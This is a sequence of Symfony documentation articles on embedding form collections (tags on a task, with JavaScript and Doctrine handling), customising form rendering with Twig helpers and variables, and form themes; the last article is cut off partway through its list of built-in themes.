Symfony Forms can embed a collection of many other forms, which is useful to
edit related entities in a single form. In this article, you'll create a form to
edit a ``Task`` class and, right inside the same form, you'll be able to edit,
create and remove many ``Tag`` objects related to that Task.

Let's start by creating a ``Task`` entity::

    // src/Entity/Task.php
    namespace App\Entity;

    use Doctrine\Common\Collections\Collection;

    class Task
    {
        protected string $description;
        protected Collection $tags;

        public function __construct()
        {
            $this->tags = new ArrayCollection();
        }

        public function getDescription(): string
        {
            return $this->description;
        }

        public function setDescription(string $description): void
        {
            $this->description = $description;
        }

        public function getTags(): Collection
        {
            return $this->tags;
        }
    }

.. note::

    The `ArrayCollection`_ is specific to Doctrine and is similar to a PHP array
    but provides many utility methods.

Now, create a ``Tag`` class. As you saw above, a ``Task`` can have many ``Tag``
objects::

    // src/Entity/Tag.php
    namespace App\Entity;

    class Tag
    {
        private string $name;

        public function getName(): string
        {
            return $this->name;
        }

        public function setName(string $name): void
        {
            $this->name = $name;
        }
    }

Then, create a form class so that a ``Tag`` object can be modified by the user::

    // src/Form/TagType.php
    namespace App\Form;

    use App\Entity\Tag;
    use Symfony\Component\Form\AbstractType;
    use Symfony\Component\Form\FormBuilderInterface;
    use Symfony\Component\OptionsResolver\OptionsResolver;

    class TagType extends AbstractType
    {
        public function buildForm(FormBuilderInterface $builder, array $options): void
        {
            $builder->add('name');
        }

        public function configureOptions(OptionsResolver $resolver): void
        {
            $resolver->setDefaults([
                'data_class' => Tag::class,
            ]);
        }
    }

Next, let's create a form for the ``Task`` entity, using a
:doc:`CollectionType </reference/forms/types/collection>` field of ``TagType``
forms. This will allow us to modify all the ``Tag`` elements of a ``Task`` right
inside the task form itself::

    // src/Form/TaskType.php
    namespace App\Form;

    use App\Entity\Task;
    use Symfony\Component\Form\AbstractType;
    use Symfony\Component\Form\Extension\Core\Type\CollectionType;
    use Symfony\Component\Form\FormBuilderInterface;
    use Symfony\Component\OptionsResolver\OptionsResolver;

    class TaskType extends AbstractType
    {
        public function buildForm(FormBuilderInterface $builder, array $options): void
        {
            $builder->add('description');

            $builder->add('tags', CollectionType::class, [
                'entry_type' => TagType::class,
                'entry_options' => ['label' => false],
            ]);
        }

        public function configureOptions(OptionsResolver $resolver): void
        {
            $resolver->setDefaults([
                'data_class' => Task::class,
            ]);
        }
    }

In your controller, you'll create a new form from the ``TaskType``::

    // src/Controller/TaskController.php
    namespace App\Controller;

    use App\Entity\Tag;
    use App\Entity\Task;
    use App\Form\TaskType;
    use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
    use Symfony\Component\HttpFoundation\Request;
    use Symfony\Component\HttpFoundation\Response;

    class TaskController extends AbstractController
    {
        public function new(Request $request): Response
        {
            $task = new Task();

            // dummy code - add some example tags to the task
            // (otherwise, the template will render an empty list of tags)
            $tag1 = new Tag();
            $tag1->setName('tag1');
            $task->getTags()->add($tag1);
            $tag2 = new Tag();
            $tag2->setName('tag2');
            $task->getTags()->add($tag2);
            // end dummy code

            $form = $this->createForm(TaskType::class, $task);

            $form->handleRequest($request);

            if ($form->isSubmitted() && $form->isValid()) {
                // ... do your form processing, like saving the Task and Tag entities
            }

            return $this->render('task/new.html.twig', [
                'form' => $form,
            ]);
        }
    }

In the template, you can now iterate over the existing ``TagType`` forms
to render them:

.. code-block:: html+twig

    {# templates/task/new.html.twig #}

    {# ... #}

    {{ form_start(form) }}
        {{ form_row(form.description) }}

        <h3>Tags</h3>
        <ul class="tags">
            {% for tag in form.tags %}
                <li>{{ form_row(tag.name) }}</li>
            {% endfor %}
        </ul>
    {{ form_end(form) }}

    {# ... #}

When the user submits the form, the submitted data for the ``tags`` field is
used to construct an ``ArrayCollection`` of ``Tag`` objects. The collection is
then set on the ``tag`` field of the ``Task`` and can be accessed via ``$task->getTags()``.

So far, this works great, but only to edit *existing* tags. It doesn't allow us
yet to add new tags or delete existing ones.

.. caution::

    You can embed nested collections as many levels down as you like. However,
    if you use Xdebug, you may receive a ``Maximum function nesting level of '100'
    reached, aborting!`` error. To fix this, increase the ``xdebug.max_nesting_level``
    PHP setting, or render each form field by hand using ``form_row()`` instead of
    rendering the whole form at once (e.g ``form_widget(form)``).

.. _form-collections-new-prototype:

Allowing "new" Tags with the "Prototype"
----------------------------------------

Previously you added two tags to your task in the controller. Now let the users
add as many tag forms as they need directly in the browser. This requires a bit
of JavaScript code.

.. tip::

    Instead of writing the needed JavaScript code yourself, you can use Symfony
    UX to implement this feature with only PHP and Twig code. See the
    `Symfony UX Demo of Form Collections`_.

But first, you need to let the form collection know that instead of exactly two,
it will receive an *unknown* number of tags. Otherwise, you'll see a
*"This form should not contain extra fields"* error. This is done with the
``allow_add`` option::

    // src/Form/TaskType.php

    // ...

    public function buildForm(FormBuilderInterface $builder, array $options): void
    {
        // ...

        $builder->add('tags', CollectionType::class, [
            'entry_type' => TagType::class,
            'entry_options' => ['label' => false],
            'allow_add' => true,
        ]);
    }

The ``allow_add`` option also makes a ``prototype`` variable available to you.
This "prototype" is a little "template" that contains all the HTML needed to
dynamically create any new "tag" forms with JavaScript.

Let's start with plain JavaScript (Vanilla JS) – if you're using Stimulus, see below.

To render the prototype, add
the following ``data-prototype`` attribute to the existing ``<ul>`` in your
template:

.. code-block:: html+twig

    {# the data-index attribute is required for the JavaScript code below #}
    <ul class="tags"
        data-index="{{ form.tags|length > 0 ? form.tags|last.vars.name + 1 : 0 }}"
        data-prototype="{{ form_widget(form.tags.vars.prototype)|e('html_attr') }}"
    ></ul>

On the rendered page, the result will look something like this:

.. code-block:: html

    <ul class="tags"
        data-index="0"
        data-prototype="&lt;div&gt;&lt;label class=&quot; required&quot;&gt;__name__&lt;/label&gt;&lt;div id=&quot;task_tags___name__&quot;&gt;&lt;div&gt;&lt;label for=&quot;task_tags___name___name&quot; class=&quot; required&quot;&gt;Name&lt;/label&gt;&lt;input type=&quot;text&quot; id=&quot;task_tags___name___name&quot; name=&quot;task[tags][__name__][name]&quot; required=&quot;required&quot; maxlength=&quot;255&quot; /&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;"
    ></ul>

Now add a button to dynamically add a new tag:

.. code-block:: html+twig

    <button type="button" class="add_item_link" data-collection-holder-class="tags">Add a tag</button>

.. seealso::

    If you want to customize the HTML code in the prototype, see
    :ref:`form-custom-prototype`.

.. tip::

    The ``form.tags.vars.prototype`` is a form element that looks and feels just
    like the individual ``form_widget(tag.*)`` elements inside your ``for`` loop.
    This means that you can call ``form_widget()``, ``form_row()`` or ``form_label()``
    on it. You could even choose to render only one of its fields (e.g. the
    ``name`` field):

    .. code-block:: twig

        {{ form_widget(form.tags.vars.prototype.name)|e }}

.. note::

    If you render your whole "tags" sub-form at once (e.g. ``form_row(form.tags)``),
    the ``data-prototype`` attribute is automatically added to the containing ``div``,
    and you need to adjust the following JavaScript accordingly.

Now add some JavaScript to read this attribute and dynamically add new tag forms
when the user clicks the "Add a tag" link. Add a ``<script>`` tag somewhere
on your page to include the required functionality with JavaScript:

.. code-block:: javascript

    document
      .querySelectorAll('.add_item_link')
      .forEach(btn => {
          btn.addEventListener("click", addFormToCollection)
      });

The ``addFormToCollection()`` function's job will be to use the ``data-prototype``
attribute to dynamically add a new form when this link is clicked. The ``data-prototype``
HTML contains the tag's ``text`` input element with a name of ``task[tags][__name__][name]``
and id of ``task_tags___name___name``. The ``__name__`` is a placeholder, which
you'll replace with a unique, incrementing number (e.g. ``task[tags][3][name]``):

.. code-block:: javascript

    function addFormToCollection(e) {
      const collectionHolder = document.querySelector('.' + e.currentTarget.dataset.collectionHolderClass);

      const item = document.createElement('li');

      item.innerHTML = collectionHolder
        .dataset
        .prototype
        .replace(
          /__name__/g,
          collectionHolder.dataset.index
        );

      collectionHolder.appendChild(item);

      collectionHolder.dataset.index++;
    };

Now, each time a user clicks the ``Add a tag`` link, a new sub form will
appear on the page. When the form is submitted, any new tag forms will be converted
into new ``Tag`` objects and added to the ``tags`` property of the ``Task`` object.

.. seealso::

    You can find a working example in this `JSFiddle`_.

JavaScript with Stimulus
~~~~~~~~~~~~~~~~~~~~~~~~

If you're using `Stimulus`_, wrap everything in a ``<div>``:

.. code-block:: html+twig

    <div {{ stimulus_controller('form-collection') }}
        data-form-collection-index-value="{{ form.tags|length > 0 ? form.tags|last.vars.name + 1 : 0 }}"
        data-form-collection-prototype-value="{{ form_widget(form.tags.vars.prototype)|e('html_attr') }}"
    >
        <ul {{ stimulus_target('form-collection', 'collectionContainer') }}></ul>
        <button type="button" {{ stimulus_action('form-collection', 'addCollectionElement') }}>Add a tag</button>
    </div>

Then create the controller:

.. code-block:: javascript

    // assets/controllers/form-collection_controller.js

    import { Controller } from '@hotwired/stimulus';

    export default class extends Controller {
        static targets = ["collectionContainer"]

        static values = {
            index    : Number,
            prototype: String,
        }

        addCollectionElement(event)
        {
            const item = document.createElement('li');
            item.innerHTML = this.prototypeValue.replace(/__name__/g, this.indexValue);
            this.collectionContainerTarget.appendChild(item);
            this.indexValue++;
        }
    }

Handling the new Tags in PHP
~~~~~~~~~~~~~~~~~~~~~~~~~~~~

To make handling these new tags easier, add an "adder" and a "remover" method
for the tags in the ``Task`` class::

    // src/Entity/Task.php
    namespace App\Entity;

    // ...
    class Task
    {
        // ...

        public function addTag(Tag $tag): void
        {
            $this->tags->add($tag);
        }

        public function removeTag(Tag $tag): void
        {
            // ...
        }
    }

Next, add a ``by_reference`` option to the ``tags`` field and set it to ``false``::

    // src/Form/TaskType.php

    // ...
    public function buildForm(FormBuilderInterface $builder, array $options): void
    {
        // ...

        $builder->add('tags', CollectionType::class, [
            // ...
            'by_reference' => false,
        ]);
    }

With these two changes, when the form is submitted, each new ``Tag`` object
is added to the ``Task`` class by calling the ``addTag()`` method. Before this
change, they were added internally by the form by calling ``$task->getTags()->add($tag)``.
That was fine, but forcing the use of the "adder" method makes handling
these new ``Tag`` objects easier (especially if you're using Doctrine, which
you will learn about next!).

.. caution::

    You have to create **both** ``addTag()`` and ``removeTag()`` methods,
    otherwise the form will still use ``setTag()`` even if ``by_reference`` is ``false``.
    You'll learn more about the ``removeTag()`` method later in this article.

.. caution::

    Symfony can only make the plural-to-singular conversion (e.g. from the
    ``tags`` property to the ``addTag()`` method) for English words. Code
    written in any other language won't work as expected.

.. sidebar:: Doctrine: Cascading Relations and saving the "Inverse" side

    To save the new tags with Doctrine, you need to consider a couple more
    things. First, unless you iterate over all of the new ``Tag`` objects and
    call ``$entityManager->persist($tag)`` on each, you'll receive an error from
    Doctrine:

    .. code-block:: text

        A new entity was found through the relationship
        ``App\Entity\Task#tags`` that was not configured to
        cascade persist operations for entity...

    To fix this, you may choose to "cascade" the persist operation automatically
    from the ``Task`` object to any related tags. To do this, add the ``cascade``
    option to your ``ManyToMany`` metadata:

    .. configuration-block::

        .. code-block:: php-attributes

            // src/Entity/Task.php

            // ...

            #[ORM\ManyToMany(targetEntity: Tag::class, cascade: ['persist'])]
            protected Collection $tags;

        .. code-block:: yaml

            # src/Resources/config/doctrine/Task.orm.yaml
            App\Entity\Task:
                type: entity
                # ...
                oneToMany:
                    tags:
                        targetEntity: App\Entity\Tag
                        cascade:      [persist]

        .. code-block:: xml

            <!-- src/Resources/config/doctrine/Task.orm.xml -->
            <?xml version="1.0" encoding="UTF-8" ?>
            <doctrine-mapping xmlns="http://doctrine-project.org/schemas/orm/doctrine-mapping"
                xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                xsi:schemaLocation="http://doctrine-project.org/schemas/orm/doctrine-mapping
                                https://doctrine-project.org/schemas/orm/doctrine-mapping.xsd">

                <entity name="App\Entity\Task">
                    <!-- ... -->
                    <one-to-many field="tags" target-entity="Tag">
                        <cascade>
                            <cascade-persist/>
                        </cascade>
                    </one-to-many>
                </entity>
            </doctrine-mapping>

    A second potential issue deals with the `Owning Side and Inverse Side`_
    of Doctrine relationships. In this example, if the "owning" side of the
    relationship is "Task", then persistence will work fine as the tags are
    properly added to the Task. However, if the owning side is on "Tag", then
    you'll need to do a little bit more work to ensure that the correct side
    of the relationship is modified.

    The trick is to make sure that the single "Task" is set on each "Tag".
    One way to do this is to add some extra logic to ``addTag()``, which
    is called by the form type since ``by_reference`` is set to ``false``::

        // src/Entity/Task.php

        // ...
        public function addTag(Tag $tag): void
        {
            // for a many-to-many association:
            $tag->addTask($this);

            // for a many-to-one association:
            $tag->setTask($this);

            $this->tags->add($tag);
        }

    If you're going for ``addTask()``, make sure you have an appropriate method
    that looks something like this::

        // src/Entity/Tag.php

        // ...
        public function addTask(Task $task): void
        {
            if (!$this->tasks->contains($task)) {
                $this->tasks->add($task);
            }
        }

.. _form-collections-remove:

Allowing Tags to be Removed
---------------------------

The next step is to allow the deletion of a particular item in the collection.
The solution is similar to allowing tags to be added.

Start by adding the ``allow_delete`` option in the form Type::

    // src/Form/TaskType.php

    // ...
    public function buildForm(FormBuilderInterface $builder, array $options): void
    {
        // ...

        $builder->add('tags', CollectionType::class, [
            // ...
            'allow_delete' => true,
        ]);
    }

Now, you need to put some code into the ``removeTag()`` method of ``Task``::

    // src/Entity/Task.php

    // ...
    class Task
    {
        // ...

        public function removeTag(Tag $tag): void
        {
            $this->tags->removeElement($tag);
        }
    }

The ``allow_delete`` option means that if an item of a collection
isn't sent on submission, the related data is removed from the collection
on the server. In order for this to work in an HTML form, you must remove
the DOM element for the collection item to be removed, before submitting
the form.

In the JavaScript code, add a "delete" button to each existing tag on the page.
Then, append the "add delete button" method in the function that adds the new tags:

.. code-block:: javascript

    document
        .querySelectorAll('ul.tags li')
        .forEach((tag) => {
            addTagFormDeleteLink(tag)
        })

    // ... the rest of the block from above

    function addFormToCollection(e) {
        // ...

        // add a delete link to the new form
        addTagFormDeleteLink(item);
    }

The ``addTagFormDeleteLink()`` function will look something like this:

.. code-block:: javascript

    function addTagFormDeleteLink(item) {
        const removeFormButton = document.createElement('button');
        removeFormButton.innerText = 'Delete this tag';

        item.append(removeFormButton);

        removeFormButton.addEventListener('click', (e) => {
            e.preventDefault();
            // remove the li for the tag form
            item.remove();
        });
    }

When a tag form is removed from the DOM and submitted, the removed ``Tag`` object
will not be included in the collection passed to ``setTags()``. Depending on
your persistence layer, this may or may not be enough to actually remove
the relationship between the removed ``Tag`` and ``Task`` object.

.. sidebar:: Doctrine: Ensuring the database persistence

    When removing objects in this way, you may need to do a little bit more
    work to ensure that the relationship between the ``Task`` and the removed
    ``Tag`` is properly removed.

    In Doctrine, you have two sides of the relationship: the owning side and the
    inverse side. Normally in this case you'll have a many-to-one relationship
    and the deleted tags will disappear and persist correctly (adding new
    tags also works effortlessly).

    But if you have a one-to-many relationship or a many-to-many relationship with a
    ``mappedBy`` on the Task entity (meaning Task is the "inverse" side),
    you'll need to do more work for the removed tags to persist correctly.

    In this case, you can modify the controller to remove the relationship
    on the removed tag. This assumes that you have some ``edit()`` action which
    is handling the "update" of your Task::

        // src/Controller/TaskController.php

        // ...
        use App\Entity\Task;
        use Doctrine\Common\Collections\ArrayCollection;

        class TaskController extends AbstractController
        {
            public function edit(Task $task, Request $request, EntityManagerInterface $entityManager): Response
            {
                $originalTags = new ArrayCollection();

                // Create an ArrayCollection of the current Tag objects in the database
                foreach ($task->getTags() as $tag) {
                    $originalTags->add($tag);
                }

                $editForm = $this->createForm(TaskType::class, $task);

                $editForm->handleRequest($request);

                if ($editForm->isSubmitted() && $editForm->isValid()) {
                    // remove the relationship between the tag and the Task
                    foreach ($originalTags as $tag) {
                        if (false === $task->getTags()->contains($tag)) {
                            // remove the Task from the Tag
                            $tag->getTasks()->removeElement($task);

                            // if it was a many-to-one relationship, remove the relationship like this
                            // $tag->setTask(null);

                            $entityManager->persist($tag);

                            // if you wanted to delete the Tag entirely, you can also do that
                            // $entityManager->remove($tag);
                        }
                    }

                    $entityManager->persist($task);
                    $entityManager->flush();

                    // redirect back to some edit page
                    return $this->redirectToRoute('task_edit', ['id' => $id]);
                }

                // ... render some form template
            }
        }

    As you can see, adding and removing the elements correctly can be tricky.
    Unless you have a many-to-many relationship where Task is the "owning" side,
    you'll need to do extra work to make sure that the relationship is properly
    updated (whether you're adding new tags or removing existing tags) on
    each Tag object itself.

.. seealso::

    The Symfony community has created some JavaScript packages that provide the
    functionality needed to add, edit and delete elements of the collection.
    Check out the `@a2lix/symfony-collection`_ package for modern browsers and
    the `symfony-collection`_ package based on jQuery for the rest of browsers.

.. _`Owning Side and Inverse Side`: https://www.doctrine-project.org/projects/doctrine-orm/en/current/reference/unitofwork-associations.html
.. _`JSFiddle`: https://jsfiddle.net/ey8ozh6n/
.. _`@a2lix/symfony-collection`: https://github.com/a2lix/symfony-collection
.. _`symfony-collection`: https://github.com/ninsuo/symfony-collection
.. _`ArrayCollection`: https://www.doctrine-project.org/projects/doctrine-collections/en/1.6/index.html
.. _`Symfony UX Demo of Form Collections`: https://ux.symfony.com/live-component/demos/form-collection-type
.. _`Stimulus`: https://symfony.com/doc/current/frontend/encore/simple-example.html#stimulus-symfony-ux
How to Customize Form Rendering
===============================

Symfony gives you several ways to customize how a form is rendered. In this
article you'll learn how to make single customizations to one or more fields of
your forms. If you need to customize all your forms in the same way, create
instead a :doc:`form theme </form/form_themes>` or use any of the built-in
themes, such as the :doc:`Bootstrap theme for Symfony forms </form/bootstrap4>`.

.. _form-rendering-basics:

Form Rendering Functions
------------------------

A single call to the :ref:`form() Twig function <reference-forms-twig-form>` is
enough to render an entire form, including all its fields and error messages:

.. code-block:: twig

    {# form is a variable passed from the controller via
      $this->render('...', ['form' => $form])
      or $this->render('...', ['form' => $form->createView()]) #}
    {{ form(form) }}

The next step is to use the :ref:`form_start() <reference-forms-twig-start>`,
:ref:`form_end() <reference-forms-twig-end>`,
:ref:`form_errors() <reference-forms-twig-errors>` and
:ref:`form_row() <reference-forms-twig-row>` Twig functions to render the
different form parts so you can customize them adding HTML elements and attributes:

.. code-block:: html+twig

    {{ form_start(form) }}
        <div class="my-custom-class-for-errors">
            {{ form_errors(form) }}
        </div>

        <div class="row">
            <div class="col">
                {{ form_row(form.task) }}
            </div>
            <div class="col" id="some-custom-id">
                {{ form_row(form.dueDate) }}
            </div>
        </div>
    {{ form_end(form) }}

The ``form_row()`` function outputs the entire field contents, including the
label, help message, HTML elements and error messages. All this can be further
customized using other Twig functions, as illustrated in the following diagram:

.. raw:: html

    <object data="../_images/form/form-field-parts.svg" type="image/svg+xml"
        alt="Wireframe showing all functions in a form row, which are mentioned directly below."
    ></object>

The :ref:`form_label() <reference-forms-twig-label>`,
:ref:`form_widget() <reference-forms-twig-widget>` (the HTML input),
:ref:`form_help() <reference-forms-twig-help>` and
:ref:`form_errors() <reference-forms-twig-errors>` Twig functions give you total
control over how each form field is rendered, so you can fully customize them:

.. code-block:: html+twig

    <div class="form-control">
        <i class="fa fa-calendar"></i> {{ form_label(form.dueDate) }}
        {{ form_widget(form.dueDate) }}

        <small>{{ form_help(form.dueDate) }}</small>

        <div class="form-error">
            {{ form_errors(form.dueDate) }}
        </div>
    </div>

.. caution::

   If you're rendering each field manually, make sure you don't forget the
   ``_token`` field that is automatically added for CSRF protection.

   You can also use ``{{ form_rest(form) }}`` (recommended) to render any
   fields that aren't rendered manually. See
   :ref:`the form_rest() documentation <reference-forms-twig-rest>` below for
   more information.

.. note::

    Later in this article you can find the full reference of these Twig
    functions with more usage examples.

.. _reference-forms-twig-field-helpers:

Form Field Helpers
------------------

The ``form_*()`` helpers shown in the previous section render different parts of
the form field, including all its HTML elements. Some developers and designers
struggle with this behavior, because it hides all the HTML elements in form
themes which are not trivial to customize.

That's why Symfony provides other Twig form helpers that render the value of
each form field part without adding any HTML around it:

* ``field_name()``
* ``field_value()``
* ``field_label()``
* ``field_help()``
* ``field_errors()``
* ``field_choices()`` (an iterator for choice fields; e.g. for ``<select>``)

When using these helpers, you must write all the HTML contents for all form
fields, so you no longer have to deal with form themes:

.. code-block:: html+twig

    <input
        name="{{ field_name(form.username) }}"
        value="{{ field_value(form.username) }}"
        placeholder="{{ field_label(form.username) }}"
        class="form-control"
    >

    <select name="{{ field_name(form.country) }}" class="form-control">
        <option value="">{{ field_label(form.country) }}</option>

        {% for label, value in field_choices(form.country) %}
            <option value="{{ value }}">{{ label }}</option>
        {% endfor %}
    </select>

Form Rendering Variables
------------------------

Some of the Twig functions mentioned in the previous section allow to pass
variables to configure their behavior. For example, the ``form_label()``
function lets you define a custom label to override the one defined in the form:

.. code-block:: twig

    {{ form_label(form.task, 'My Custom Task Label') }}

Some :doc:`form field types </reference/forms/types>` have additional rendering
options that can be passed to the widget. These options are documented with each
type, but one common option is ``attr``, which allows you to modify HTML
attributes on the form element. The following would add the ``task_field`` CSS
class to the rendered input text field:

.. code-block:: twig

    {{ form_widget(form.task, {'attr': {'class': 'task_field'}}) }}

.. note::

    If you're rendering an entire form at once (or an entire embedded form),
    the ``variables`` argument will only be applied to the form itself and
    not its children. In other words, the following will **not** pass a
    "foo" class attribute to all of the child fields in the form:

    .. code-block:: twig

        {# does **not** work - the variables are not recursive #}
        {{ form_widget(form, { 'attr': {'class': 'foo'} }) }}

If you need to render form fields "by hand" then you can access individual
values for fields (such as the ``id``, ``name`` and ``label``) using its
``vars``  property. For example to get the ``id``:

.. code-block:: twig

    {{ form.task.vars.id }}

.. note::

    Later in this article you can find the full reference of these Twig
    variables and their description.

Form Themes
-----------

The Twig functions and variables shown in the previous sections can help you
customize one or more fields of your forms. However, this customization can't
be applied to the rest of the forms of your app.

If you want to customize all forms in the same way (for example to adapt the
generated HTML code to the CSS framework used in your app) you must create a
:doc:`form theme </form/form_themes>`.

.. _reference-form-twig-functions-variables:

Form Functions and Variables Reference
--------------------------------------

.. _reference-form-twig-functions:

Functions
~~~~~~~~~

.. _reference-forms-twig-form:

form(form_view, variables)
..........................

Renders the HTML of a complete form.

.. code-block:: twig

    {# render the form and change the submission method #}
    {{ form(form, {'method': 'GET'}) }}

You will mostly use this helper for prototyping or if you use custom form
themes. If you need more flexibility in rendering the form, you should use
the other helpers to render individual parts of the form instead:

.. code-block:: twig

    {{ form_start(form) }}
        {{ form_errors(form) }}

        {{ form_row(form.name) }}
        {{ form_row(form.dueDate) }}

        {{ form_row(form.submit, { 'label': 'Submit me' }) }}
    {{ form_end(form) }}

.. _reference-forms-twig-start:

form_start(form_view, variables)
................................

Renders the start tag of a form. This helper takes care of printing the
configured method and target action of the form. It will also include the
correct ``enctype`` property if the form contains upload fields.

.. code-block:: twig

    {# render the start tag and change the submission method #}
    {{ form_start(form, {'method': 'GET'}) }}

.. _reference-forms-twig-end:

form_end(form_view, variables)
..............................

Renders the end tag of a form.

.. code-block:: twig

    {{ form_end(form) }}

This helper also outputs ``form_rest()`` (which is explained later in this
article) unless you set ``render_rest`` to false:

.. code-block:: twig

    {# don't render unrendered fields #}
    {{ form_end(form, {render_rest: false}) }}

.. _reference-forms-twig-label:

form_label(form_view, label, variables)
.......................................

Renders the label for the given field. You can optionally pass the specific
label you want to display as the second argument.

.. code-block:: twig

    {{ form_label(form.name) }}

    {# The two following syntaxes are equivalent #}
    {{ form_label(form.name, 'Your Name', {'label_attr': {'class': 'foo'}}) }}

    {{ form_label(form.name, null, {
        'label': 'Your name',
        'label_attr': {'class': 'foo'}
    }) }}

See ":ref:`twig-reference-form-variables`" to learn about the ``variables``
argument.

.. _reference-forms-twig-help:

form_help(form_view)
....................

Renders the help text for the given field.

.. code-block:: twig

    {{ form_help(form.name) }}

.. _reference-forms-twig-errors:

form_errors(form_view)
......................

Renders any errors for the given field.

.. code-block:: twig

    {# render only the error messages related to this field #}
    {{ form_errors(form.name) }}

    {# render any "global" errors not associated to any form field #}
    {{ form_errors(form) }}

.. caution::

    In the Bootstrap 4 form theme, ``form_errors()`` is already included in
    ``form_label()``. Read more about this in the
    :ref:`Bootstrap 4 theme documentation <reference-forms-bootstrap4-error-messages>`.

.. _reference-forms-twig-widget:

form_widget(form_view, variables)
.................................

Renders the HTML widget of a given field. If you apply this to an entire
form or collection of fields, each underlying form row will be rendered.

.. code-block:: twig

    {# render a widget, but add a "foo" class to it #}
    {{ form_widget(form.name, {'attr': {'class': 'foo'}}) }}

The second argument to ``form_widget()`` is an array of variables. The most
common variable is ``attr``, which is an array of HTML attributes to apply
to the HTML widget. In some cases, certain types also have other template-related
options that can be passed. These are discussed on a type-by-type basis.
The ``attributes`` are not applied recursively to child fields if you're
rendering many fields at once (e.g. ``form_widget(form)``).

See ":ref:`twig-reference-form-variables`" to learn more about the ``variables``
argument.

.. _reference-forms-twig-row:

form_row(form_view, variables)
..............................

Renders the "row" of a given field, which is the combination of the field's
label, errors, help and widget.

.. code-block:: twig

    {# render a field row, but display a label with text "foo" #}
    {{ form_row(form.name, {'label': 'foo'}) }}

The second argument to ``form_row()`` is an array of variables. The templates
provided in Symfony only allow to override the label as shown in the example
above.

See ":ref:`twig-reference-form-variables`" to learn about the ``variables``
argument.

.. _reference-forms-twig-rest:

form_rest(form_view, variables)
...............................

This renders all fields that have not yet been rendered for the given form.
It's a good idea to always have this somewhere inside your form as it'll
render hidden fields for you and make any fields you forgot to render easier to
spot (since it'll render the field for you).

.. code-block:: twig

    {{ form_rest(form) }}

form_parent(form_view)
......................

Returns the parent form view or ``null`` if the form view already is the
root form. Using this function should be preferred over accessing the parent
form using ``form.parent``. The latter way will produce different results
when a child form is named ``parent``.

Tests
~~~~~

Tests can be executed by using the ``is`` operator in Twig to create a
condition. Read `the Twig documentation`_ for more information.

.. _form-twig-selectedchoice:

selectedchoice(selected_value)
..............................

This test will check if the current choice is equal to the ``selected_value``
or if the current choice is in the array (when ``selected_value`` is an
array).

.. code-block:: html+twig

    <option {% if choice is selectedchoice(value) %}selected="selected"{% endif %}>

.. _form-twig-rootform:

rootform
........

This test will check if the current ``form`` does not have a parent form view.

.. code-block:: twig

    {# DON'T DO THIS: this simple check can't differentiate between a form having
       a parent form view and a form defining a nested form field called 'parent' #}

    {% if form.parent is null %}
        {{ form_errors(form) }}
    {% endif %}

   {# DO THIS: this check is always reliable, even if the form defines a field called 'parent' #}

    {% if form is rootform %}
        {{ form_errors(form) }}
    {% endif %}

.. _twig-reference-form-variables:
.. _reference-form-twig-variables:

Form Variables Reference
~~~~~~~~~~~~~~~~~~~~~~~~

The following variables are common to every field type. Certain field types
may define even more variables and some variables here only really apply to
certain types. To know the exact variables available for each type, check out
the code of the templates used by your :doc:`form theme </form/form_themes>`.

Assuming you have a ``form`` variable in your template and you want to
reference the variables on the ``name`` field, accessing the variables is
done by using a public ``vars`` property on the
:class:`Symfony\\Component\\Form\\FormView` object:

.. code-block:: html+twig

    <label for="{{ form.name.vars.id }}"
        class="{{ form.name.vars.required ? 'required' }}">
        {{ form.name.vars.label }}
    </label>

======================  ======================================================================================
Variable                Usage
======================  ======================================================================================
``action``              The action of the current form.
``attr``                A key-value array that will be rendered as HTML attributes on the field.
``block_prefixes``      An array of all the names of the parent types.
``cache_key``           A unique key which is used for caching.
``compound``            Whether or not a field is actually a holder for a group of children fields
                        (for example, a ``choice`` field, which is actually a group of checkboxes).
``data``                The normalized data of the type.
``disabled``            If ``true``, ``disabled="disabled"`` is added to the field.
``errors``              An array of any errors attached to *this* specific field (e.g. ``form.title.errors``).
                        Note that you can't use ``form.errors`` to determine if a form is valid,
                        since this only returns "global" errors: some individual fields may have errors.
                        Instead, use the ``valid`` option.
``form``                The current ``FormView`` instance.
``full_name``           The ``name`` HTML attribute to be rendered.
``help``                The help message that will be rendered.
``id``                  The ``id`` HTML attribute to be rendered.
``label``               The string label that will be rendered.
``label_attr``          A key-value array that will be rendered as HTML attributes on the label.
``method``              The method of the current form (POST, GET, etc.).
``multipart``           If ``true``, ``form_enctype`` will render ``enctype="multipart/form-data"``.
``name``                The name of the field (e.g. ``title``) - but not the ``name``
                        HTML attribute, which is ``full_name``.
``required``            If ``true``, a ``required`` attribute is added to the field to activate HTML5
                        validation. Additionally, a ``required`` class is added to the label.
``submitted``           Returns ``true`` or ``false`` depending on whether the whole form is submitted
``translation_domain``  The domain of the translations for this form.
``valid``               Returns ``true`` or ``false`` depending on whether the whole form is valid.
``value``               The value that will be used when rendering (commonly the ``value`` HTML attribute).
                        This only applies to the root form element.
======================  ======================================================================================

.. tip::

    Behind the scenes, these variables are made available to the ``FormView``
    object of your form when the Form component calls ``buildView()`` and
    ``finishView()`` on each "node" of your form tree. To see what "view"
    variables a particular field has, find the source code for the form
    field (and its parent fields) and look at the above two functions.

.. _`the Twig documentation`: https://twig.symfony.com/doc/3.x/templates.html#test-operator
How to Access Services or Config from Inside a Form
===================================================

The content of this article is no longer relevant because in current Symfony
versions, form classes are services by default and you can inject services in
them using the :doc:`service autowiring </service_container/autowiring>` feature.

Read the article about :doc:`creating custom form types </form/create_custom_field_type>`
to see an example of how to inject the database service into a form type. In the
same article you can also read about
:ref:`configuration options for form types <form-type-config-options>`, which is
another way of passing services to forms.
How to Work with Form Themes
============================

This article explains how to use in your app any of the form themes provided by
Symfony and how to create your own custom form theme.

.. _symfony-builtin-forms:

Symfony Built-In Form Themes
----------------------------

Symfony comes with several **built-in form themes** that make your forms look
great when using some of the most popular CSS frameworks. Each theme is defined
in a single Twig template and they are enabled in the
:ref:`twig.form_themes <config-twig-form-themes>` option:

* `form_div_layout.html.twig`_, wraps each form field inside a ``<div>`` element
  and it's the theme used by default in Symfony applications unless you configure
  it as explained later in this article.
* `form_table_layout.html.twig`_, wraps the entire form inside a ``<table>``
  element and each form field inside a ``<tr>`` element.
* `bootstrap_3_layout.html.twig`_, wraps each form field inside a ``<div>``
  element with the appropriate CSS classes to apply the styles used by the
  `Bootstrap 3 CSS framework`_.
* `bootstrap_3_horizontal_layout.html.twig`_, it's similar to the previous
  theme, but the CSS classes applied are the ones used to display the forms
  horizontally (i.e. the label and the widget in the same row).
